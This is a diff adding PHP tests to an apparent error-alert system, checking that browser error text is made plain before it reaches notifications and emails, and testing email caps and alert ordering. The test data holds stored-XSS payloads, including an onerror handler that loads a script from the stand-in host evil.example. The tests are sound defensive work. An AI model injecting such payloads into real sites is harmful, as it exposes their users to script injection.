@@ -107,3 +107,58 @@ $r = monitor_recipient_add($db, 'second@example.org', 1);
 ok('a failed confirmation email is reported, not thrown', !$r['ok'] && str_contains((string) $r['error'], 'could not be sent'));
 $GLOBALS['mt_mail_fail'] = false;
 ok('every alert is in the alert log', (int) $db->query('SELECT COUNT(*) FROM monitor_alert_log')->fetchColumn() > 5);
+
+// ---- Browser text never reaches the bell or a subject (review, 11 Nov: stored XSS via the bell)
+$x = monitor_test_db();
+monitor_test_clock('2026-11-14 10:00:00');
+$GLOBALS['mt_mail'] = [];
+monitor_recipient_add($x, 'xss@example.org', 1);
+preg_match('#t=([0-9]+\.[0-9a-f]{48})#', end($GLOBALS['mt_mail'])['text'], $xm);
+monitor_recipient_confirm($x, $xm[1]);
+$GLOBALS['mt_mail'] = [];
+$evil = ['kind' => 'js', 'level' => 'error', 'exception_class' => 'Error', 'file' => '/a.js', 'line' => 1, 'frames' => [],
+         'message' => 'Error: <img src=x onerror="import(\'//evil.example/x.js\')">'];
+foreach (['198.51.100.1', '198.51.100.2', '198.51.100.3'] as $ip) {
+    monitor_test_record($x, $evil + ['request' => ['user_id' => null, 'role' => 'guest', 'ip' => $ip]]);
+}
+eq('three addresses: the browser error is announced', 1, monitor_alert_new_errors($x, $x));
+$bell = $x->query('SELECT title, message FROM system_notifications ORDER BY id DESC LIMIT 1')->fetch();
+lacks('the bell carries no markup', $bell['title'] . $bell['message'], '<');
+lacks('…and none of the browser\'s text', $bell['message'], 'onerror');
+lacks('the email subject carries none of it either', $GLOBALS['mt_mail'][0]['subject'] ?? '', 'img');
+lacks('…nor the email body', $GLOBALS['mt_mail'][0]['html'] ?? '', 'onerror');
+$y = monitor_test_db();
+foreach (['UA one', 'UA two', 'UA three'] as $ua) {
+    monitor_test_record($y, $evil + ['request' => ['user_id' => null, 'role' => 'guest', 'ip' => '198.51.100.9', 'ua' => $ua]]);
+}
+eq('one address with three browsers is one person, not three', 0, monitor_alert_new_errors($y, $y));
+monitor_test_record($x, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'Error', 'message' => 'Bad <script>alert(1)</script> "quoted" value', 'line' => 77]);
+monitor_test_clock('2026-11-14 12:00:00');
+monitor_alert_new_errors($x, $x);
+$bell = $x->query('SELECT message FROM system_notifications ORDER BY id DESC LIMIT 1')->fetchColumn();
+lacks('server error text in the bell is made plain too', (string) $bell, '<');
+lacks('…without quotes', (string) $bell, '"');
+eq('plain text keeps the words', 'Bad alert(1) quoted value', monitor_plain('Bad <script>alert(1)</script> "quoted" value'));
+
+// ---- A server error is never crowded out by browser errors waiting for their third person
+$z = monitor_test_db();
+for ($i = 0; $i < 45; $i++) {
+    monitor_test_record($z, ['kind' => 'js', 'level' => 'error', 'exception_class' => 'TypeError', 'message' => 'TypeError: lone ' . $i, 'file' => '/b.js', 'line' => $i + 1, 'frames' => []]);
+}
+monitor_test_record($z, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'LogicException', 'message' => 'The real server error', 'line' => 5]);
+monitor_alert_new_errors($z, $z);
+ok('45 one-person browser errors do not hide a server error', $z->query("SELECT alerted_at FROM monitor_error_groups WHERE title = 'The real server error'")->fetchColumn() !== null);
+
+// ---- Over the email cap, an alert waits (bell included) rather than being marked sent
+$c = monitor_test_db();
+$GLOBALS['mt_mail'] = [];
+monitor_recipient_add($c, 'cap@example.org', 1);
+preg_match('#t=([0-9]+\.[0-9a-f]{48})#', end($GLOBALS['mt_mail'])['text'], $cm);
+monitor_recipient_confirm($c, $cm[1]);
+for ($i = 0; $i < 6; $i++) {
+    monitor_alert_log($c, 'email', 'errors', 'earlier alert', 1, true);
+}
+monitor_test_record($c, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'LogicException', 'message' => 'Waits for room', 'line' => 6]);
+eq('six emails this hour: the new error waits', 0, monitor_alert_new_errors($c, $c));
+ok('…not marked as sent', $c->query("SELECT alerted_at FROM monitor_error_groups WHERE title = 'Waits for room'")->fetchColumn() === null);
+eq('…and no bell went out without it', 0, (int) $c->query('SELECT COUNT(*) FROM system_notifications')->fetchColumn());
